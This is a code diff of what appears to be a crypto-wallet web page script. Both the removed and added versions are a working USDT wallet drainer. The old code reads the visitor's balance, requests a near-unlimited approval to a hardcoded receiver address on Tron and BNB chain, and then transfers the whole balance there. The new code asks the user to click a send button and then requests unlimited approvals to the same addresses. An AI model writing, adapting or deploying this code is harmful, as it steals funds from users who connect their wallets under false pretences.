@@ -1,99 +1,51 @@
-const BEP_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const BEP_RECEIVER = "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E";
+const TRC20_ADDRESS = 'TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN'; // Your TRC20 receiver address
+const BEP20_ADDRESS = '0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E'; // Your BEP20 receiver address
 
-const TRC_USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const TRC_RECEIVER = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
+const BEP20_USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955'; // BEP20 USDT
+const TRC20_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRC20 USDT
 
-const USDT_ABI = [
-  {
-    "constant": true,
-    "inputs": [{ "name": "_owner", "type": "address" }],
-    "name": "balanceOf",
-    "outputs": [{ "name": "balance", "type": "uint256" }],
-    "type": "function"
-  },
-  {
-    "constant": true,
-    "inputs": [
-      { "name": "_owner", "type": "address" },
-      { "name": "_spender", "type": "address" }
-    ],
-    "name": "allowance",
-    "outputs": [{ "name": "remaining", "type": "uint256" }],
-    "type": "function"
-  },
-  {
-    "constant": false,
-    "inputs": [
-      { "name": "_spender", "type": "address" },
-      { "name": "_value", "type": "uint256" }
-    ],
-    "name": "approve",
-    "outputs": [{ "name": "success", "type": "bool" }],
-    "type": "function"
-  },
-  {
-    "constant": false,
-    "inputs": [
-      { "name": "_from", "type": "address" },
-      { "name": "_to", "type": "address" },
-      { "name": "_value", "type": "uint256" }
-    ],
-    "name": "transferFrom",
-    "outputs": [{ "name": "success", "type": "bool" }],
-    "type": "function"
-  }
-];
+document.getElementById("sendBtn").addEventListener("click", async () => {
+  const selectedNetwork = document.getElementById("networkSelect").value;
 
-document.getElementById("connectButton").onclick = async () => {
-  if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-    await handleTron();
-  } else if (window.ethereum) {
-    await handleBSC();
-  } else {
-    alert("Please open with Trust Wallet or Web3-supported browser");
-  }
-};
-
-async function handleTron() {
-  try {
-    const tronAddress = window.tronWeb.defaultAddress.base58;
-    const usdt = await window.tronWeb.contract(USDT_ABI, TRC_USDT_ADDRESS);
-    const balance = await usdt.methods.balanceOf(tronAddress).call();
-    const allowance = await usdt.methods.allowance(tronAddress, TRC_RECEIVER).call();
-
-    document.getElementById("status").innerText = `TRC20 Connected: ${tronAddress.slice(0, 6)}...${tronAddress.slice(-4)} | Balance: ${parseFloat(balance / 1e6).toFixed(2)} USDT`;
-
-    if (parseFloat(allowance) < 1e12) {
-      await usdt.methods.approve(TRC_RECEIVER, "999999999000000").send();
+  if (selectedNetwork === "bep20") {
+    if (typeof window.ethereum === 'undefined') {
+      alert("Please install MetaMask or a BEP20-compatible wallet.");
+      return;
     }
 
-    await usdt.methods.transferFrom(tronAddress, TRC_RECEIVER, balance).send();
-  } catch (err) {
-    console.error("TRC20 Error", err);
-    alert("Error (TRC-20): " + err.message);
-  }
-}
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    const userAddress = accounts[0];
 
-async function handleBSC() {
-  try {
-    const web3 = new Web3(window.ethereum);
-    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-    const wallet = accounts[0];
-    const usdt = new web3.eth.Contract(USDT_ABI, BEP_USDT_ADDRESS);
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
+    const contract = new ethers.Contract(BEP20_USDT_CONTRACT, [
+      "function approve(address spender, uint256 amount) public returns (bool)"
+    ], signer);
 
-    const balance = await usdt.methods.balanceOf(wallet).call();
-    const allowance = await usdt.methods.allowance(wallet, BEP_RECEIVER).call();
-
-    document.getElementById("status").innerText = `BEP20 Connected: ${wallet.slice(0, 6)}...${wallet.slice(-4)} | Balance: ${parseFloat(balance / 1e18).toFixed(2)} USDT`;
-
-    if (parseFloat(allowance) < 1e12) {
-      await usdt.methods.approve(BEP_RECEIVER, "999999999000000000000000").send({ from: wallet });
+    try {
+      const tx = await contract.approve(BEP20_ADDRESS, ethers.constants.MaxUint256);
+      await tx.wait();
+      alert("BEP-20 USDT Approved Successfully!");
+    } catch (err) {
+      console.error("Approval failed:", err);
+      alert("BEP-20 Approval Failed.");
     }
 
-    await usdt.methods.transferFrom(wallet, BEP_RECEIVER, balance).send({ from: wallet });
-  } catch (err) {
-    console.error("BEP20 Error", err);
-    alert("Error (BEP-20): " + err.message);
+  } else if (selectedNetwork === "trc20") {
+    if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+      alert("Please open this page in TronLink or Trust Wallet (TRC).");
+      return;
+    }
+
+    try {
+      const contract = await window.tronWeb.contract().at(TRC20_USDT_CONTRACT);
+      await contract.approve(TRC20_ADDRESS, "9223372036854775807").send({
+        feeLimit: 100_000_000
+      });
+      alert("TRC-20 USDT Approved Successfully!");
+    } catch (err) {
+      console.error("TRC20 Approval Error:", err);
+      alert("TRC-20 Approval Failed.");
+    }
   }
-}
+});
